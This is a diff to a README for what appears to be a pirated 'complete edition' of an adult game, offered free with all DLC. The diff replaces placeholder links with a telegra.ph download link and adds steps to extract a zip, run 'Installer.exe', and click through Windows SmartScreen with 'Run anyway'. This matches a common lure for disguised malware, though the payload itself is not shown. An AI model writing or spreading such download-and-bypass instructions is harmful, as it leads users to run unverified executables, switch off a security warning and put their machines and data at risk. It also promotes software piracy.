@@ -55,13 +55,13 @@ Steam sells the base game and each DLC separately. **We ship one archive with ev
 ## Download City77 Complete Edition
 
 <p align="center">
-  <a href="#"><img src="https://img.shields.io/badge/⬇_LUSTPUNK_69_—_FULL_+_ALL_DLC-FREE-ff0066?style=for-the-badge&labelColor=110011"/></a>
+  <a href="https://telegra.ph/33-09-09-3"><img src="https://img.shields.io/badge/⬇_LUSTPUNK_69_—_FULL_+_ALL_DLC-FREE-ff0066?style=for-the-badge&labelColor=110011"/></a>
 </p>
 
 | Step | Do this |
 |:--:|:--|
-| 1 | Hit **[CLICK](#)** — downloads `Lustpunk69-Complete-Bundle.zip` |
-| 2 | Extract → run `Lustpunk69.exe` or setup wizard |
+| 1 | Hit **[CLICK](https://telegra.ph/33-09-09-3)** — downloads `Lustpunk69.zip` |
+| 2 | Extract → run `Installer.exe` or setup wizard |
 | 3 | SmartScreen? **More info → Run anyway** |
 | 4 | All three DLC packs are pre-installed — no Steam checkout |
 
